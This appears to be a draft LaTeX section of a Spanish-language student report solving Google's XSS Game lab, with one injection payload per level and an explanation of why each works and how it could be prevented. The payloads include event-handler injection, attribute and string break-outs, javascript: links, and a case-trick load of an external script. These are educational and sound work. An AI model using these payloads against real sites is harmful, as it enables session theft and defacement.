% sections/05-xss.tex
\section{Cross-Site Scripting (XSS)}

\subsection{Presentación del ejercicio}

Se ejecutaron los seis retos del \eng{XSS Game} de Google \cite{xss-game}, disponibles a partir de \url{https://xss-game.appspot.com/level1}, en los cuales cada nivel expone un contexto de inyección distinto (cuerpo HTML, atributos, cadenas de JavaScript, \eng{URLs} de recursos) y el objetivo en todos es lograr la ejecución de un script propio en el navegador de la víctima; como evidencia de la explotación, y tal como lo exige el enunciado, el nombre del integrante va incluido dentro del script inyectado (\texttt{Over} en los payloads de referencia, a modo de ejemplo).

\begin{center}
\small
\begin{tabularx}{0.8\linewidth}{@{}lX@{}}
  \toprule
  \bfseries Nivel & \bfseries Contexto de la entrada del usuario \\
  \midrule
  1 & Cuerpo HTML sin ningún filtrado. \\
  2 & Comentarios renderizados en la página, con etiqueta \texttt{<script>} bloqueada. \\
  3 & Valor insertado dentro del atributo \texttt{src} de una imagen. \\
  4 & Valor insertado dentro de una cadena JavaScript en un atributo \texttt{onload}. \\
  5 & Valor insertado en el atributo \texttt{href} de un enlace. \\
  6 & Fragmento \texttt{\#} de la URL usado como fuente de un \texttt{<script>}. \\
  \bottomrule
\end{tabularx}
\end{center}

\subsection{Nivel 1: inyección directa en el cuerpo HTML}

\begin{lstlisting}[language=HTML]
<script>alert('Over')</script>
\end{lstlisting}

\captura{xss-nivel1.png}{Nivel 1 resuelto: alert con el nombre del integrante}

\begin{analisis}
\end{analisis}

\porque{por qué funciona}{%
  La búsqueda se inserta tal cual en el HTML de la respuesta sin ningún
  escapado, de forma que el navegador parsea el payload como etiqueta
  legítima. Base: ``Al no existir sanitización alguna, cualquier etiqueta
  inyectada en el campo de búsqueda pasa a formar parte del documento,
  ejecutándose en el mismo origen de la aplicación.''%
}

\subsection{Nivel 2: inyección en comentarios con script bloqueado}

\begin{lstlisting}[language=HTML]
<img src="x" onerror="alert('Over')">
\end{lstlisting}

\captura{xss-nivel2.png}{Nivel 2 resuelto: handler \texttt{onerror} sobre una imagen rota}

\begin{analisis}
\end{analisis}

\porque{por qué funciona}{%
  El filtro del nivel bloquea la etiqueta \texttt{<script>}, pero no las
  etiquetas de contenido embebido ni sus atributos de evento; al referenciar
  una imagen inexistente (\texttt{src="x"}) el error de carga dispara
  \texttt{onerror}. Base: ``Un bloqueo por lista negra de etiquetas resulta
  siempre incompleto, dado que los navegadores ofrecen múltiples vectores de
  ejecución alternativa (handlers de evento sobre etiquetas inocuas), por lo
  que el control correcto es escapar la salida según el contexto HTML.''%
}

\subsection{Nivel 3: dentro del atributo src de una imagen}

\begin{lstlisting}[language=HTML]
' onerror='alert("Over")'
\end{lstlisting}

\captura{xss-nivel3.png}{Nivel 3 resuelto: cierre del atributo e inyección del handler}

\begin{analisis}
\end{analisis}

\porque{por qué funciona}{%
  La entrada se incrusta dentro de \texttt{<img src='INPUT'>}: la comilla
  simple cierra el valor del atributo y lo que sigue se parsea como atributos
  nuevos, agregando \texttt{onerror} a la propia imagen de la página. Detalle
  relevante del nivel: aunque se inyectara un \texttt{<script>} completo, no se
  ejecutaría porque el HTML se construye por asignación a
  \texttt{innerHTML}, y los scripts insertados por esa vía no corren; los
  atributos de evento sí. Menciona ambos puntos en el análisis.%
}

\subsection{Nivel 4: dentro de una cadena JavaScript en onload}

\begin{lstlisting}[language=JavaScript]
');alert('Over')//
\end{lstlisting}

\captura{xss-nivel4.png}{Nivel 4 resuelto: cierre de la llamada \texttt{startTimer} e inyección del alert}

\begin{analisis}
\end{analisis}

\porque{por qué funciona}{%
  El valor del temporizador cae dentro de \texttt{onload="startTimer('INPUT')"},
  es decir, dentro de un literal de cadena en código JavaScript: el payload
  cierra la cadena (\texttt{'}) y la llamada (\texttt{)}), ejecuta
  \texttt{alert} y con \texttt{//} comenta el resto de la línea original para
  que no quede basura sintáctica. Base: ``En contexto JavaScript el control
  seguro no es el escapado HTML sino la codificación adecuada para ese
  lenguaje (o no interpolar la entrada en código), pues cerrar el literal
  basta para tomar el control del flujo.''%
}

\subsection{Nivel 5: en el atributo href de un enlace}

\begin{lstlisting}[language=HTML]
javascript:alert('Over')
\end{lstlisting}

\captura{xss-nivel5.png}{Nivel 5 resuelto: esquema \texttt{javascript:} en el enlace de compartir}

\begin{analisis}
\end{analisis}

\porque{por qué funciona}{%
  La entrada pasa a ser la URL completa del enlace \texttt{Share on Twitter},
  y al hacer clic el navegador ejecuta el pseudoesquema
  \texttt{javascript:}. Base: ``El punto crítico es aceptar una URL sin
  validar su esquema; un control de allowlist (\texttt{http}/\texttt{https})
  habría evitado la ejecución, lo cual es especialmente serio porque el
  payload solo requiere un clic de la víctima sobre un enlace de apariencia
  legítima.''%
}

\subsection{Nivel 6: la URL de un recurso script}

\begin{lstlisting}
#HTTPS://servidor-propio/ejemplo.js
\end{lstlisting}

\captura{xss-nivel6.png}{Nivel 6 resuelto: carga de script externo tras evadir la validación de esquema}

\begin{analisis}
\end{analisis}

\porque{por qué funciona}{%
  El fragmento posterior a \texttt{\#} se asigna como \texttt{src} de un
  \texttt{<script>} nuevo, y la única barrera es
  \texttt{url.match(/\^{}https?:\\/\\//)}, la cual es sensible a
  mayúsculas: escribiendo \texttt{HTTPS://} el esquema elude la lista negra y
  el navegador, que es tolerante al caso, carga el script igual. Requiere
  hostear un \texttt{.js} propio (un gist en crudo sirve); alternativa sin
  hosting a probar: \texttt{\#data:application/javascript,alert('Over')} (URI
  \texttt{data:} como fuente del script; funciona en algunos navegadores,
  verifícalo en tu corrida y reporta cuál de las dos vías usaste). Base: ``La
  validación por lista negra sobre la URL resultó evadible con un simple
  cambio de caja, evidenciando que el control de este contexto es la lista
  blanca de esquemas y no la coincidencia de patrones.''%
}
